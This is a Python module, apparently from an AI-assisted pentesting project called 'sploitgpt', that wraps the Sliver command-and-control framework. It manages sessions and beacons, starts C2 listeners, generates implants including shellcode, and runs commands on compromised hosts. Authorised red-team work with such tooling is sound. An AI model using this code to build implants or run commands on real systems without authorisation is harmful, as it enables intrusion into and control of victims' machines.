"""
Sliver C2 Integration

Connects to Sliver server via gRPC for session/beacon management, implant
generation, and post-exploitation. Uses sliver-py as the underlying client.
"""

import asyncio
import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from sliver import SliverClient, SliverClientConfig
from sliver import client_pb2


@dataclass
class SliverSession:
    """Represents an active Sliver session (interactive)."""

    id: str
    name: str
    hostname: str
    username: str
    uid: str
    gid: str
    os: str
    arch: str
    transport: str
    remote_address: str
    pid: int
    filename: str
    active_c2: str
    reconnect_interval: int
    proxy_url: str
    burned: bool
    extensions: list[str] = field(default_factory=list)

    @classmethod
    def from_pb(cls, pb: client_pb2.Session) -> "SliverSession":
        """Create from protobuf Session object."""
        return cls(
            id=pb.ID,
            name=pb.Name,
            hostname=pb.Hostname,
            username=pb.Username,
            uid=pb.UID,
            gid=pb.GID,
            os=pb.OS,
            arch=pb.Arch,
            transport=pb.Transport,
            remote_address=pb.RemoteAddress,
            pid=pb.PID,
            filename=pb.Filename,
            active_c2=pb.ActiveC2,
            reconnect_interval=pb.ReconnectInterval,
            proxy_url=pb.ProxyURL,
            burned=pb.Burned,
            extensions=list(pb.Extensions) if pb.Extensions else [],
        )


@dataclass
class SliverBeacon:
    """Represents an active Sliver beacon (async check-in)."""

    id: str
    name: str
    hostname: str
    username: str
    uid: str
    gid: str
    os: str
    arch: str
    transport: str
    remote_address: str
    pid: int
    filename: str
    active_c2: str
    interval: int  # Check-in interval in seconds
    jitter: int  # Jitter percentage
    burned: bool
    next_checkin: int  # Unix timestamp

    @classmethod
    def from_pb(cls, pb: client_pb2.Beacon) -> "SliverBeacon":
        """Create from protobuf Beacon object."""
        return cls(
            id=pb.ID,
            name=pb.Name,
            hostname=pb.Hostname,
            username=pb.Username,
            uid=pb.UID,
            gid=pb.GID,
            os=pb.OS,
            arch=pb.Arch,
            transport=pb.Transport,
            remote_address=pb.RemoteAddress,
            pid=pb.PID,
            filename=pb.Filename,
            active_c2=pb.ActiveC2,
            interval=pb.Interval,
            jitter=pb.Jitter,
            burned=pb.Burned,
            next_checkin=pb.NextCheckin,
        )


@dataclass
class SliverJob:
    """Represents an active Sliver job (listener)."""

    id: int
    name: str
    description: str
    protocol: str
    port: int
    domains: list[str] = field(default_factory=list)

    @classmethod
    def from_pb(cls, pb: client_pb2.Job) -> "SliverJob":
        """Create from protobuf Job object."""
        return cls(
            id=pb.ID,
            name=pb.Name,
            description=pb.Description,
            protocol=pb.Protocol,
            port=pb.Port,
            domains=list(pb.Domains) if pb.Domains else [],
        )


class SliverRPC:
    """
    Sliver gRPC Client.

    Connects to Sliver server via gRPC for session/beacon management,
    listener control, and implant generation.
    """

    def __init__(self, config_path: str | Path | None = None):
        """
        Initialize Sliver client.

        Args:
            config_path: Path to operator config file (.cfg).
                         If None, uses SPLOITGPT_SLIVER_CONFIG env var
                         or default path.
        """
        self.config_path = self._resolve_config_path(config_path)
        self._config: SliverClientConfig | None = None
        self._client: SliverClient | None = None

    def _resolve_config_path(self, config_path: str | Path | None) -> Path:
        """Resolve config path from various sources."""
        if config_path:
            return Path(config_path)

        # Check environment variable
        env_path = os.environ.get("SPLOITGPT_SLIVER_CONFIG")
        if env_path:
            return Path(env_path)

        # Default paths to check
        default_paths = [
            Path("/app/configs/sliver/sploitgpt.cfg"),  # Container path
            Path("configs/sliver/sploitgpt.cfg"),  # Relative path
            Path.home() / ".sliver-client" / "configs" / "default.cfg",  # Standard
        ]

        for path in default_paths:
            if path.exists():
                return path

        # Return first default if none exist (will fail on connect)
        return default_paths[0]

    @property
    def is_connected(self) -> bool:
        """Return True if the gRPC client is connected."""
        return self._client is not None and self._client.is_connected()

    async def connect(self, *, quiet: bool = True) -> bool:
        """
        Connect to Sliver server.

        Args:
            quiet: Suppress connection errors if True.

        Returns:
            True if connected successfully.
        """
        try:
            if self.is_connected:
                return True

            if not self.config_path.exists():
                if not quiet:
                    print(f"Sliver config not found: {self.config_path}")
                return False

            # Parse operator config
            self._config = SliverClientConfig.parse_config_file(str(self.config_path))
            self._client = SliverClient(self._config)

            # Connect and get version
            version = await self._client.connect()

            # Echo to viewer
            try:
                from sploitgpt.sliver.viewer import echo_connection

                echo_connection(
                    self._config.lhost,
                    self._config.lport,
                    f"{version.Major}.{version.Minor}.{version.Patch}",
                )
            except Exception:
                pass

            return True

        except Exception as e:
            self._client = None
            self._config = None
            if not quiet:
                print(f"Sliver connection failed: {e}")
            return False

    async def disconnect(self) -> None:
        """Disconnect from Sliver server."""
        # sliver-py doesn't have explicit disconnect, just drop references
        self._client = None
        self._config = None

    # =========================================================================
    # Server Info
    # =========================================================================

    async def version(self) -> dict[str, Any]:
        """Get server version information."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        v = await self._client.version()
        return {
            "major": v.Major,
            "minor": v.Minor,
            "patch": v.Patch,
            "commit": v.Commit,
            "compiled_at": v.CompiledAt,
            "os": v.OS,
            "arch": v.Arch,
        }

    async def operators(self) -> list[dict[str, Any]]:
        """Get list of connected operators."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        ops = await self._client.operators()
        return [{"name": op.Name, "online": op.Online} for op in ops]

    # =========================================================================
    # Session Management
    # =========================================================================

    async def list_sessions(self) -> list[SliverSession]:
        """List all active sessions."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        sessions = await self._client.sessions()
        return [SliverSession.from_pb(s) for s in sessions]

    async def get_session(self, session_id: str) -> SliverSession | None:
        """Get session by ID."""
        sessions = await self.list_sessions()
        for s in sessions:
            if s.id == session_id:
                return s
        return None

    async def interact_session(self, session_id: str):
        """
        Get interactive session handle for command execution.

        Returns an InteractiveSession from sliver-py.
        """
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        return await self._client.interact_session(session_id)

    async def kill_session(self, session_id: str, force: bool = False) -> bool:
        """Kill a session."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        try:
            await self._client.kill_session(session_id, force=force)
            return True
        except Exception:
            return False

    async def rename_session(self, session_id: str, name: str) -> bool:
        """Rename a session."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        try:
            await self._client.rename_session(session_id, name)
            return True
        except Exception:
            return False

    # =========================================================================
    # Beacon Management
    # =========================================================================

    async def list_beacons(self) -> list[SliverBeacon]:
        """List all active beacons."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        beacons = await self._client.beacons()
        return [SliverBeacon.from_pb(b) for b in beacons]

    async def get_beacon(self, beacon_id: str) -> SliverBeacon | None:
        """Get beacon by ID."""
        beacons = await self.list_beacons()
        for b in beacons:
            if b.id == beacon_id:
                return b
        return None

    async def interact_beacon(self, beacon_id: str):
        """
        Get interactive beacon handle for task creation.

        Returns an InteractiveBeacon from sliver-py.
        Note: Beacon commands return tasks that complete on next check-in.
        """
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        return await self._client.interact_beacon(beacon_id)

    async def kill_beacon(self, beacon_id: str) -> bool:
        """Kill/remove a beacon."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        try:
            await self._client.kill_beacon(beacon_id)
            return True
        except Exception:
            return False

    async def rename_beacon(self, beacon_id: str, name: str) -> bool:
        """Rename a beacon."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        try:
            await self._client.rename_beacon(beacon_id, name)
            return True
        except Exception:
            return False

    # =========================================================================
    # Job/Listener Management
    # =========================================================================

    async def list_jobs(self) -> list[SliverJob]:
        """List all active jobs (listeners)."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        jobs = await self._client.jobs()
        return [SliverJob.from_pb(j) for j in jobs]

    async def kill_job(self, job_id: int) -> bool:
        """Kill a job/listener."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        try:
            await self._client.kill_job(job_id)
            return True
        except Exception:
            return False

    async def start_mtls_listener(
        self,
        host: str = "0.0.0.0",
        port: int = 8888,
        persistent: bool = False,
    ) -> dict[str, Any]:
        """Start an mTLS C2 listener."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        result = await self._client.start_mtls_listener(host=host, port=port, persistent=persistent)
        return {"job_id": result.JobID}

    async def start_http_listener(
        self,
        host: str = "0.0.0.0",
        port: int = 80,
        domain: str = "",
        website: str = "",
        persistent: bool = False,
    ) -> dict[str, Any]:
        """Start an HTTP C2 listener."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        result = await self._client.start_http_listener(
            host=host,
            port=port,
            domain=domain,
            website=website,
            persistent=persistent,
        )
        return {"job_id": result.JobID}

    async def start_https_listener(
        self,
        host: str = "0.0.0.0",
        port: int = 443,
        domain: str = "",
        website: str = "",
        cert: bytes = b"",
        key: bytes = b"",
        acme: bool = False,
        persistent: bool = False,
    ) -> dict[str, Any]:
        """Start an HTTPS C2 listener."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        result = await self._client.start_https_listener(
            host=host,
            port=port,
            domain=domain,
            website=website,
            cert=cert,
            key=key,
            acme=acme,
            persistent=persistent,
        )
        return {"job_id": result.JobID}

    async def start_dns_listener(
        self,
        domains: list[str],
        host: str = "0.0.0.0",
        port: int = 53,
        canaries: bool = True,
        persistent: bool = False,
    ) -> dict[str, Any]:
        """Start a DNS C2 listener."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        result = await self._client.start_dns_listener(
            domains=domains,
            host=host,
            port=port,
            canaries=canaries,
            persistent=persistent,
        )
        return {"job_id": result.JobID}

    # =========================================================================
    # Implant Generation
    # =========================================================================

    async def implant_profiles(self) -> list[dict[str, Any]]:
        """Get list of saved implant profiles."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        profiles = await self._client.implant_profiles()
        return [
            {
                "name": p.Name,
                "config": {
                    "goos": p.Config.GOOS,
                    "goarch": p.Config.GOARCH,
                    "format": p.Config.Format,
                    "is_beacon": p.Config.IsBeacon,
                    "c2": [{"priority": c.Priority, "url": c.URL} for c in p.Config.C2],
                },
            }
            for p in profiles
        ]

    async def implant_builds(self) -> dict[str, dict[str, Any]]:
        """Get list of historical implant builds."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        builds = await self._client.implant_builds()
        return {
            name: {
                "goos": config.GOOS,
                "goarch": config.GOARCH,
                "format": config.Format,
                "is_beacon": config.IsBeacon,
            }
            for name, config in builds.items()
        }

    async def generate_implant(
        self,
        os: str = "linux",
        arch: str = "amd64",
        format: str = "EXECUTABLE",
        c2_url: str = "",
        is_beacon: bool = False,
        beacon_interval: int = 60,
        beacon_jitter: int = 30,
        name: str = "",
        timeout: int = 360,
    ) -> bytes:
        """
        Generate a new implant.

        Args:
            os: Target OS (linux, windows, darwin)
            arch: Target architecture (amd64, 386, arm64)
            format: Output format (EXECUTABLE, SHARED_LIB, SERVICE, SHELLCODE)
            c2_url: C2 callback URL (e.g., mtls://10.0.0.1:8888)
            is_beacon: Generate beacon (async) vs session (interactive)
            beacon_interval: Beacon check-in interval in seconds
            beacon_jitter: Beacon jitter percentage (0-100)
            name: Implant name (auto-generated if empty)
            timeout: Generation timeout in seconds

        Returns:
            Raw implant binary bytes.
        """
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        # Map format string to enum
        format_map = {
            "EXECUTABLE": client_pb2.OutputFormat.EXECUTABLE,
            "SHARED_LIB": client_pb2.OutputFormat.SHARED_LIB,
            "SERVICE": client_pb2.OutputFormat.SERVICE,
            "SHELLCODE": client_pb2.OutputFormat.SHELLCODE,
        }
        output_format = format_map.get(format.upper(), client_pb2.OutputFormat.EXECUTABLE)

        # Build C2 config
        c2_configs = []
        if c2_url:
            c2_configs.append(client_pb2.ImplantC2(Priority=0, URL=c2_url))

        # Build implant config
        config = client_pb2.ImplantConfig(
            GOOS=os.lower(),
            GOARCH=arch.lower(),
            Format=output_format,
            IsBeacon=is_beacon,
            BeaconInterval=beacon_interval,
            BeaconJitter=beacon_jitter,
            C2=c2_configs,
            Name=name,
        )

        result = await self._client.generate_implant(config, timeout=timeout)
        return result.File.Data

    async def regenerate_implant(self, implant_name: str) -> bytes:
        """Regenerate an existing implant by name."""
        if not self._client:
            raise RuntimeError("Not connected to Sliver")

        result = await self._client.regenerate_implant(implant_name)
        return result.File.Data


# =========================================================================
# Convenience Functions
# =========================================================================


def get_sliver_client(config_path: str | None = None) -> SliverRPC:
    """Create a Sliver client from configuration."""
    return SliverRPC(config_path=config_path)


async def list_sliver_sessions(sliver: SliverRPC | None = None) -> str:
    """List Sliver sessions and return formatted results."""
    own_client = sliver is None

    if own_client:
        sliver = get_sliver_client()
        if not await sliver.connect():
            return "Could not connect to Sliver. Ensure the server is running and config exists."

    assert sliver is not None

    try:
        sessions = await sliver.list_sessions()
        beacons = await sliver.list_beacons()

        if not sessions and not beacons:
            return "No active sessions or beacons."

        lines = []

        if sessions:
            lines.append(f"**Sessions ({len(sessions)}):**\n")
            for s in sessions:
                lines.append(f"  `{s.id[:8]}` - {s.name}")
                lines.append(f"    {s.username}@{s.hostname} ({s.os}/{s.arch})")
                lines.append(f"    Transport: {s.transport} | PID: {s.pid}")
                lines.append("")

        if beacons:
            lines.append(f"**Beacons ({len(beacons)}):**\n")
            for b in beacons:
                lines.append(f"  `{b.id[:8]}` - {b.name}")
                lines.append(f"    {b.username}@{b.hostname} ({b.os}/{b.arch})")
                lines.append(f"    Interval: {b.interval}s | Jitter: {b.jitter}%")
                lines.append("")

        return "\n".join(lines)

    finally:
        if own_client:
            await sliver.disconnect()


async def execute_on_session(
    session_id: str,
    command: str,
    args: list[str] | None = None,
    sliver: SliverRPC | None = None,
) -> str:
    """Execute command on a Sliver session."""
    own_client = sliver is None

    if own_client:
        sliver = get_sliver_client()
        if not await sliver.connect():
            return "Could not connect to Sliver."

    assert sliver is not None

    try:
        interact = await sliver.interact_session(session_id)
        if not interact:
            return f"Session {session_id} not found."

        result = await interact.execute(command, args or [], output=True)
        stdout = result.Stdout.decode("utf-8", errors="replace") if result.Stdout else ""
        stderr = result.Stderr.decode("utf-8", errors="replace") if result.Stderr else ""

        output = []
        if stdout:
            output.append(stdout)
        if stderr:
            output.append(f"[stderr]\n{stderr}")

        return "\n".join(output) if output else "(no output)"

    finally:
        if own_client:
            await sliver.disconnect()
